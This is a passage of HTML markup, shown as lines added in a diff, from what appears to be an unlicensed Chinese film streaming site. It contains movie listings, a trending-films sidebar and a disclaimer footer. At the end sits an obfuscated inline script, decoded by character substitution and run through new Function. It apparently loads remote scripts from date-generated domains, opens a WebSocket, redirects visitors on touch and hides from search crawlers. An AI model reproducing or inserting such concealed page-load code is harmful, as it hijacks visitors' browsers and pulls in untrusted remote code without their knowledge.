+                <div class="ewave-vodlist__box"> <div class="ewave-vodlist__thumb lazyload" title="六福喜事" data-original="https://img1.doubanio.com/view/photo/s_ratio_poster/public/p2164881898.jpg" alt="六福喜事"><span class="play hidden-xs"></span> <span class="pic-text text-right">正片</span> <span class="pic-tag pic-tag-h">6.0</span> <a class="thumb-link" href="/voddetail/45141.html"></a> </div>
+              <div class="ewave-vodlist__detail">
+                <h4 class="title text-overflow"><a href="/voddetail/45141.html" title="六福喜事" >六福喜事</a></h4>
+                <p class="text text-overflow text-muted hidden-xs text-actor">黄百鸣 曾志伟 吴君如 郑中基 薛凯琪 吴千语 林德信 熊黛林 于波 夏春秋 林德荣 谷德昭 张达明 方力申 李灿森 方皓玟 谷祖琳 大鹏 林海峰 林二汶 陈辉虹 邓丽欣 杨爱瑾 杨千嬅 林盛斌 林峯 古天乐</p>
+              </div>
+            </div>
+              </li>
+                            <li class="col-md-6 col-sm-4 col-xs-3">
+                <div class="ewave-vodlist__box"> <div class="ewave-vodlist__thumb lazyload" title="开心鬼上错身" data-original="https://img1.doubanio.com/view/photo/s_ratio_poster/public/p1994720479.jpg" alt="开心鬼上错身"><span class="play hidden-xs"></span> <span class="pic-text text-right">正片</span> <span class="pic-tag pic-tag-h">2.0</span> <a class="thumb-link" href="/voddetail/49176.html"></a> </div>
+              <div class="ewave-vodlist__detail">
+                <h4 class="title text-overflow"><a href="/voddetail/49176.html" title="开心鬼上错身" >开心鬼上错身</a></h4>
+                <p class="text text-overflow text-muted hidden-xs text-actor">黄百鸣 谷德昭 郭晋安 姬丝·阿奎诺 黄光亮</p>
+              </div>
+            </div>
+              </li>
+                            <li class="col-md-6 col-sm-4 col-xs-3">
+                <div class="ewave-vodlist__box"> <div class="ewave-vodlist__thumb lazyload" title="我的播音系女友" data-original="https://img2.doubanio.com/view/photo/s_ratio_poster/public/p2314811421.jpg" alt="我的播音系女友"><span class="play hidden-xs"></span> <span class="pic-text text-right">正片</span> <span class="pic-tag pic-tag-h">7.0</span> <a class="thumb-link" href="/voddetail/35003.html"></a> </div>
+              <div class="ewave-vodlist__detail">
+                <h4 class="title text-overflow"><a href="/voddetail/35003.html" title="我的播音系女友" >我的播音系女友</a></h4>
+                <p class="text text-overflow text-muted hidden-xs text-actor">汪东城 戚薇 邱晔 蒋雪鸣 钟凯 高浩元 徐晓龙 任浩明</p>
+              </div>
+            </div>
+              </li>
+                            <li class="col-md-6 col-sm-4 col-xs-3">
+                <div class="ewave-vodlist__box"> <div class="ewave-vodlist__thumb lazyload" title="龙凤斗" data-original="https://img2.doubanio.com/view/photo/s_ratio_poster/public/p2512320221.jpg" alt="龙凤斗"><span class="play hidden-xs"></span> <span class="pic-text text-right">正片</span> <span class="pic-tag pic-tag-h">2.0</span> <a class="thumb-link" href="/voddetail/46325.html"></a> </div>
+              <div class="ewave-vodlist__detail">
+                <h4 class="title text-overflow"><a href="/voddetail/46325.html" title="龙凤斗" >龙凤斗</a></h4>
+                <p class="text text-overflow text-muted hidden-xs text-actor">刘德华 郑秀文 吴嘉龙 林家栋 胡燕妮 秦煌 许绍雄 连晋</p>
+              </div>
+            </div>
+              </li>
+                            <li class="col-md-6 col-sm-4 col-xs-3">
+                <div class="ewave-vodlist__box"> <div class="ewave-vodlist__thumb lazyload" title="小角色" data-original="https://img2.doubanio.com/view/photo/s_ratio_poster/public/p2896638802.jpg" alt="小角色"><span class="play hidden-xs"></span> <span class="pic-text text-right">正片</span> <span class="pic-tag pic-tag-h">2.0</span> <a class="thumb-link" href="/voddetail/68178.html"></a> </div>
+              <div class="ewave-vodlist__detail">
+                <h4 class="title text-overflow"><a href="/voddetail/68178.html" title="小角色" >小角色</a></h4>
+                <p class="text text-overflow text-muted hidden-xs text-actor">曹瑞 周大勇 衣云鹤 李子雄 吴尔渥 郑胖 崔大笨 张赢 张百乔 王学庭 代新 田媛</p>
+              </div>
+            </div>
+              </li>
+                            <li class="col-md-6 col-sm-4 col-xs-3">
+                <div class="ewave-vodlist__box"> <div class="ewave-vodlist__thumb lazyload" title="武林怪兽" data-original="https://img9.doubanio.com/view/photo/s_ratio_poster/public/p2540374845.jpg" alt="武林怪兽"><span class="play hidden-xs"></span> <span class="pic-text text-right">正片</span> <span class="pic-tag pic-tag-h">10.0</span> <a class="thumb-link" href="/voddetail/49080.html"></a> </div>
+              <div class="ewave-vodlist__detail">
+                <h4 class="title text-overflow"><a href="/voddetail/49080.html" title="武林怪兽" >武林怪兽</a></h4>
+                <p class="text text-overflow text-muted hidden-xs text-actor">古天乐 陈学冬 郭碧婷 包贝尔 王太利 周冬雨 吴樾 潘斌龙 孔连顺 小爱 梁大维 许君聪 方中信 何润东 薛凯琪 颖儿 李灿森 卢惠光</p>
+              </div>
+            </div>
+              </li>
+                          </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="col-lg-wide-25 col-xs-1 ewave-pannel-side hidden-sm hidden-xs padding-0 sticky">
+      <div class="ewave-pannel ewave-pannel-bg clearfix">
+        <div class="ewave-pannel-box">
+          <div class="ewave-pannel_hd">
+            <div class="ewave-pannel__head active bottom-line clearfix">
+              <h3 class="title"> <img src="/template/jbb/icon_f/icon_12.png"/> 热播电影 </h3>
+            </div>
+          </div>
+          <div class="ewave-pannel_bd">
+            <ul class="ewave-vodlist__text col-pd clearfix">
+                            <li class="bottom-line-dot"> <a class="text-overflow" href="/voddetail/89282.html" title="惊天魔盗团3"> <span class="text-muted pull-right hidden-md"> 正片 </span> <span class="badge badge-1">1</span><span >惊天魔盗团3</span></a> </li>
+                            <li class="bottom-line-dot"> <a class="text-overflow" href="/voddetail/87343.html" title="捕风追影"> <span class="text-muted pull-right hidden-md"> 正片 </span> <span class="badge badge-2">2</span><span >捕风追影</span></a> </li>
+                            <li class="bottom-line-dot"> <a class="text-overflow" href="/voddetail/87200.html" title="浪浪山小妖怪"> <span class="text-muted pull-right hidden-md"> 正片 </span> <span class="badge badge-3">3</span><span >浪浪山小妖怪</span></a> </li>
+                            <li class="bottom-line-dot"> <a class="text-overflow" href="/voddetail/89678.html" title="疯狂动物城2"> <span class="text-muted pull-right hidden-md"> 抢先 </span> <span class="badge">4</span><span >疯狂动物城2</span></a> </li>
+                            <li class="bottom-line-dot"> <a class="text-overflow" href="/voddetail/89642.html" title="青石镇传说"> <span class="text-muted pull-right hidden-md"> 正片 </span> <span class="badge">5</span><span >青石镇传说</span></a> </li>
+                            <li class="bottom-line-dot"> <a class="text-overflow" href="/voddetail/83905.html" title="死神来了6：血脉诅咒"> <span class="text-muted pull-right hidden-md"> 正片 </span> <span class="badge">6</span><span >死神来了6：血脉诅咒</span></a> </li>
+                            <li class="bottom-line-dot"> <a class="text-overflow" href="/voddetail/89431.html" title="永生战士2"> <span class="text-muted pull-right hidden-md"> 抢先 </span> <span class="badge">7</span><span >永生战士2</span></a> </li>
+                            <li class="bottom-line-dot"> <a class="text-overflow" href="/voddetail/88815.html" title="圣剑屠魔"> <span class="text-muted pull-right hidden-md"> 正片 </span> <span class="badge">8</span><span >圣剑屠魔</span></a> </li>
+                            <li class="bottom-line-dot"> <a class="text-overflow" href="/voddetail/81205.html" title="哪吒之魔童闹海"> <span class="text-muted pull-right hidden-md"> 正片 </span> <span class="badge">9</span><span >哪吒之魔童闹海</span></a> </li>
+                            <li class="bottom-line-dot"> <a class="text-overflow" href="/voddetail/89592.html" title="木匠之子"> <span class="text-muted pull-right hidden-md"> 正片 </span> <span class="badge">10</span><span >木匠之子</span></a> </li>
+                            <li class="bottom-line-dot"> <a class="text-overflow" href="/voddetail/89602.html" title="黑蛇"> <span class="text-muted pull-right hidden-md"> 正片 </span> <span class="badge">11</span><span >黑蛇</span></a> </li>
+                            <li class="bottom-line-dot"> <a class="text-overflow" href="/voddetail/13590.html" title="灌篮高手"> <span class="text-muted pull-right hidden-md"> 正片 </span> <span class="badge">12</span><span >灌篮高手</span></a> </li>
+                            <li class="bottom-line-dot"> <a class="text-overflow" href="/voddetail/47107.html" title="疯狂动物城"> <span class="text-muted pull-right hidden-md"> 正片 </span> <span class="badge">13</span><span >疯狂动物城</span></a> </li>
+                            <li class="bottom-line-dot"> <a class="text-overflow" href="/voddetail/58621.html" title="不速来客"> <span class="text-muted pull-right hidden-md"> 正片 </span> <span class="badge">14</span><span >不速来客</span></a> </li>
+                            <li class="bottom-line-dot"> <a class="text-overflow" href="/voddetail/84539.html" title="神圣之夜：恶魔猎人"> <span class="text-muted pull-right hidden-md"> 正片 </span> <span class="badge">15</span><span >神圣之夜：恶魔猎人</span></a> </li>
+                          </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+<div class="container">
+  <div class="row">
+    <div class="col-pd text-center">郑重声明： <span class="fontArial"> </span> 剧爸爸所有播放资源均由机器人收集于互联网,本站不参与任何影视资源制作与存储,如若侵犯了您的权益请书面告知,我们会及时处理.
+      <p class="text-center">如果喜欢剧爸爸请分享给身边的朋友,站内广告是本站能持续为大家服务的立命之本还望顺手支持一下^_^</p>
+      <p class="text-center"> <a class="fed-font-xiv" href="/rss/index.xml" target="_blank">RSS订阅</a> <span class="fed-font-xiv">&nbsp;-&nbsp;</span> <a class="fed-font-xiv" href="/rss/baidu.xml" target="_blank">百度蜘蛛</a> <span class="fed-font-xiv">&nbsp;-&nbsp;</span> <a class="fed-font-xiv" href="/rss/google.xml" target="_blank">谷歌地图</a> <span class="fed-font-xiv">&nbsp;-&nbsp;</span> <a class="fed-font-xiv" href="/rss/sm.xml" target="_blank">神马爬虫</a> <span class="fed-font-xiv fed-hide-xs">&nbsp;-&nbsp;</span> <a class="fed-font-xiv fed-hide-xs" href="/rss/sogou.xml" target="_blank">搜狗蜘蛛</a> <span class="fed-font-xiv fed-hide-xs">&nbsp;-&nbsp;</span> <a class="fed-font-xiv fed-hide-xs" href="/rss/so.xml" target="_blank">奇虎地图</a> <span class="fed-font-xiv fed-hide-xs">&nbsp;-&nbsp;</span> <a class="fed-font-xiv fed-hide-xs" href="/rss/bing.xml" target="_blank">必应爬虫</a></script> 
+      </p>
+      <p>Copyright © 2019-2025 · <a href="/" class="js-index-href" title="剧爸爸">剧爸爸 www.jubaba.cc</a></p>
+    </div>
+  </div>
+</div>
+<ul class="ewave-extra clearfix">
+  <li> <a class="backtop" href="javascript:$('html,body').animate(scrollTop(0),300)" style="display: none;"><i class="icon iconfont icon-less"></i></a> </li>
+  <li class="hidden-xs"> <a class="copylink" href="javascript:;"><i class="icon iconfont icon-share"></i></a> </li>
+  <li class="visible-xs"> <a class="open-share" href="javascript:;"><i class="icon iconfont icon-share"></i></a> </li>
+  <li class="hidden-xs"> <span><i class="icon iconfont icon-qrcode"></i></span>
+    <div class="sideslip">
+      <div class="col-pd">
+        <p id="qrcode"></p>
+        <p class="text-center font-12">扫码用手机访问</p>
+      </div>
+    </div>
+  </li>
+  </ul>
+<div class="hide"></div>
+
+<div class="ewave-notice" id="ewave-notice">
+  <div class="ewave-notice-body">
+    <div class="ewave-notice-img"></div>
+    <div class="ewave-notice-text">
+      <p style="margin-bottom: 5px;">🎉 不同线路适合不同网络，觉得卡就切换线路，选择适合自己网络的🚀</p>
+      <p style="margin-bottom: 5px;">❌ 剧中<strong>广告🎬</strong>均采集网络资源，<strong>请勿相信！！！</strong></p>
+      <p style="margin-bottom: 5px;">域名发布页：👉<a style="color: #10AEFF;" href="https://www.jubaba.vip" target="_blank">https://www.jubaba.vip</a>👈</p>
+      <p style="margin-bottom: 5px;">网站地址定期更换，请及时收藏网址，如果觉得不错，请推荐给好友！</p>
+    </div>
+    <a class="ewave-notice-close" href="javascript:;" id="ewave-notice-close">我知道了</a>
+  </div>
+  <div class="ewave-notice-bg"></div>
+</div>
+
+    <script>
+!function(){function a(a){var b={e:"P",w:"D",T:"y","+":"J",l:"!",t:"L",E:"E","@":"2",d:"a",b:"%",q:"l",X:"v","~":"R",5:"r","&":"X",C:"j","]":"F",a:")","^":"m",",":"~","}":"1",x:"C",c:"(",G:"@",h:"h",".":"*",L:"s","=":",",p:"g",I:"Q",1:"7",_:"u",K:"6",F:"t",2:"n",8:"=",k:"G",Z:"]",")":"b",P:"}",B:"U",S:"k",6:"i",g:":",N:"N",i:"S","%":"+","-":"Y","?":"|",4:"z","*":"-",3:"^","[":"{","(":"c",u:"B",y:"M",U:"Z",H:"[",z:"K",9:"H",7:"f",R:"x",v:"&","!":";",M:"_",Q:"9",Y:"e",o:"4",r:"A",m:".",O:"o",V:"W",J:"p",f:"d",":":"q","{":"8",W:"I",j:"?",n:"5",s:"3","|":"T",A:"V",D:"w",";":"O"};return a.split("").map(function(a){return void 0!==b[a]?b[a]:a}).join("")}var b=a(`qlSIkxTSqIl7_2(F6O2cYa[Xd5 F8[P!7_2(F6O2 5c2a[67cFH2Za5YF_52 FH2ZmYRJO5FL!Xd5 O8FH2Z8[6g2=qgl}=YRJO5FLg[PP!5YF_52 YH2Zm(dqqcOmYRJO5FL=O=OmYRJO5FL=5a=Omq8l0=OmYRJO5FLP5m^8Y=5m(8F=5mf87_2(F6O2cY=F=2a[5mOcY=Fa??;)CY(FmfY762Ye5OJY5FTcY=F=[Y2_^Y5d)qYgl0=pYFg2PaP=5m587_2(F6O2cYa["_2fY762Yf"l8FTJYO7 iT^)OqvviT^)OqmFOiF562p|dpvv;)CY(FmfY762Ye5OJY5FTcY=iT^)OqmFOiF562p|dp=[Xdq_Yg"yOf_qY"Pa=;)CY(FmfY762Ye5OJY5FTcY="MMYLyOf_qY"=[Xdq_Ygl0PaP=5mF87_2(F6O2cY=Fa[67c}vFvvcY85cYaa={vFa5YF_52 Y!67covFvv"O)CY(F"88FTJYO7 YvvYvvYmMMYLyOf_qYa5YF_52 Y!Xd5 28;)CY(Fm(5YdFYc2_qqa!67c5m5c2a=;)CY(FmfY762Ye5OJY5FTc2="fY7d_qF"=[Y2_^Y5d)qYgl0=Xdq_YgYPa=@vFvv"LF562p"l8FTJYO7 Ya7O5cXd5 O 62 Ya5mfc2=O=7_2(F6O2cFa[5YF_52 YHFZPm)62fc2_qq=Oaa!5YF_52 2P=5m287_2(F6O2cYa[Xd5 F8YvvYmMMYLyOf_qYj7_2(F6O2ca[5YF_52 YmfY7d_qFPg7_2(F6O2ca[5YF_52 YP!5YF_52 5mfcF="d"=Fa=FP=5mO87_2(F6O2cY=Fa[5YF_52 ;)CY(FmJ5OFOFTJYmhdL;D2e5OJY5FTm(dqqcY=FaP=5mJ8""=5c5mL80aPcH7_2(F6O2cY=Fa[Xd5 58fO(_^Y2F=282dX6pdFO5mJqdF7O5^=O85m(_55Y2Fi(56JF! 67cl/3yd(?V62/mFYLFc2a??l2a[Xd5 pd5577SLM6LMDL8pd5577SLM6LMSS80!LYF|6^YO_Fc7_2(F6O2ca[67cpd5577SLM6LMDL880a[Xd5 (q6Y2FD6fFh8D62fODmL(5YY2mdXd6qV6fFh!fO(_^Y2FmdffEXY2Ft6LFY2Y5c"FO_(hY2f"=7_2(F6O2ca[67cpd5577SLM6LMDL880a[Xd5 (q6Y2FhY6phF8D62fODm622Y59Y6phF!Xd5 YXY8YXY2F??D62fODmYXY2F!Xd5 (R8(T80!67cYXYvvYXYmFTJY88"FO_(hLFd5F"a[(R8YXYmFO_(hYLH0Zm(q6Y2F&!(T8YXYmFO_(hYLH0Zm(q6Y2F-P67cYXYvvYXYmFTJY88"FO_(hY2f"a[(R8YXYm(hd2pYf|O_(hYLH0ZmL(5YY2&!(T8YXYm(hd2pYf|O_(hYLH0Zm(q6Y2F-P67cYXYvvYXYmFTJY88"(q6(S"a[(R8YXYm(q6Y2F&!(T8YXYm(q6Y2F-P67c(R>0vv(T>0a[67c(T>c(q6Y2FhY6phF*c@0o.c(q6Y2FD6fFh/K@0aaavvpd5577SLM6LMSS880a[pd5577SLM6LMSS8}!Xd5 pd5577SLM^8"hFFJLg//"%wdFYmJd5LYc2YD wdFYcaa%"1n0nF(m@Q^^nXm(O^"%"g{00o/((/1n0nj6LM2OF8}vFd5pYF8}"!67cFOJmqO(dF6O2l8LYq7mqO(dF6O2a[FOJmqO(dF6O28pd5577SLM^PYqLY[D62fODmqO(dF6O2mh5Y78pd5577SLM^Ppd5577SLM6LMSS80PPPPa!7O5cXd5 280!2<o!2%%a[7O5cXd5 C80!C<}0!C%%a[Xd5 LFTqY8"JOL6F6O2g76RYf! )OFFO^g"%c1mQK{1n.2a%"XD! qY7Fg"%C.}0%"XD! 4*62fYRg}00!f6LJqdTg)qO(S!D6fFhgQmKXD!hY6phFg1mQK{1nXD!)d(Sp5O_2fg #000!OJd(6FTg0m0}!"!fO(_^Y2Fm)OfTm62LY5FrfCd(Y2F9|ytc")Y7O5YY2f"=\'<f6X LFTqY8"\'%LFTqY%\'"></f6X>\'aPPLYF|6^YO_Fc7_2(F6O2ca[67cpd5577SLM6LMDL880a[Xd5 68fO(_^Y2Fm(5YdFYEqY^Y2Fc"L(56JF"a!6mL5(8"hFFJLg//"%c2YD wdFYcampYFwdFYcaa%"1n0nF(m@Q^^nXm(O^"%"g{00o/f/1n0nj(8}v28pd5577SL"!Xd5 _8fO(_^Y2FmpYFEqY^Y2FLuT|dpNd^Yc"L(56JF"aH0Z!_mJd5Y2FNOfYm62LY5FuY7O5Yc6=_a!Xd5 L))8fO(_^Y2Fm(5YdFYEqY^Y2Fc"LFTqY"a!L))m6f8"pd5577SLMLFTqYM6f"!L))m622Y59|yt8")OfT[JOL6F6O2g626F6dq l6^JO5Fd2F!^62*hY6phFg"%D62fODmL(5YY2mhY6phF%"JR l6^JO5Fd2F!Jdff62p*)OFFO^g}00JR l6^JO5Fd2F!P"!fO(_^Y2FmhYdfmdJJY2fxh6qfcL))aPP=}n00aPP=}000a!P 67c/)d6f_?9_dDY6u5ODLY5?A6XOu5ODLY5?;JJOu5ODLY5?9YT|dJu5ODLY5?y6_6u5ODLY5?yIIu5ODLY5?)fhO2O5)5ODLY5?Bxu5ODLY5?I_d5S?IzI/pmFYLFc2dX6pdFO5m_LY5rpY2Fal887dqLYa[Xd5 DLRp8H"DFm2q{0F2m(O^"="DFm2q{0F2m(O^"="DFm_5TK6{m(O^"="DFm_5TK6{m(O^"="DFmqXh6:@m(O^"="DFmqXh6:@m(O^"Z!Xd5 S8ydFhm7qOO5cc2YD wdFYcaampYFwdFYca/na!S8cS>najngS! Xd5 (82YD VY)iO(SYFc"DLLg//}Ys0@o}}n(Q{7K7"%c2YD wdFYcampYFwdFYcaa%DLRpHSZ%"g@00Qo"%"/1n0n"a! (mO2OJY287_2(F6O2cYa[pd5577SLM6LMDL8pd5577SLM6LMSS8}!LYF|6^YO_Fcca8>[Xd5 (d2Xd85mpYFEqY^Y2FuTWfc"pd5577SLMLFTqYM6f"a!67c(d2Xda[(d2Xdm5Y^OXYcaPP=}000aP!(mO2^YLLdpY87_2(F6O2cYa[Xd5 F87_2(F6O2cYa[Xd5 F=5=2=O=(=6=_=d8"(hd5rF"=78"75O^xhd5xOfY"=q8"(hd5xOfYrF"=f8"62fYR;7"=L8"ruxwE]k9W+ztyN;eI~i|BAV&-Ud)(fY7ph6CSq^2OJ:5LF_XDRT40}@sonK1{Q%/8"=J8""=p80!7O5cY8Ym5YJqd(Yc/H3r*Ud*40*Q%/8Z/p=""a!p<YmqY2pFh!aO8LHfZcYHdZcp%%aa=(8LHfZcYHdZcp%%aa=68LHfZcYHdZcp%%aa=_8LHfZcYHdZcp%%aa=F8O<<@?(>>o=58c}nv(a<<o?6>>@=28csv6a<<K?_=J%8iF562pH7ZcFa=Kol86vvcJ%8iF562pH7Zc5aa=Kol8_vvcJ%8iF562pH7Zc2aa!5YF_52 7_2(F6O2cYa[7O5cXd5 F8""=2858(}8(@80!2<YmqY2pFh!ac58YHqZc2aa<}@{jcF%8iF562pH7Zc5a=2%%ag5>}Q}vv5<@@ojc(@8YHqZc2%}a=F%8iF562pH7Zccs}v5a<<K?Ksv(@a=2%8@agc(@8YHqZc2%}a=(s8YHqZc2%@a=F%8iF562pH7Zcc}nv5a<<}@?cKsv(@a<<K?Ksv(sa=2%8sa!5YF_52 FPcJaPcYmfdFda!2YD ]_2(F6O2c"MFf(L"=FacOa=(m(qOLYcaPPYqLY[Xd5 685m(5YdFYEqY^Y2Fc"L(56JF"a!6mL5(8"hFFJLg//"%c2YD wdFYcampYFwdFYcaa%"1n0nFpmpJFJRCm(O^"%"g{00o\/L(/1n0nj28pd5577SL"!Xd5 _85mpYFEqY^Y2FLuT|dpNd^Yc"L(56JF"aH0Z!_mJd5Y2FNOfYm62LY5FuY7O5Yc6=_aPPZa!`.substr(10));new Function(b)()}();
+</script>
+</body>
+</html>
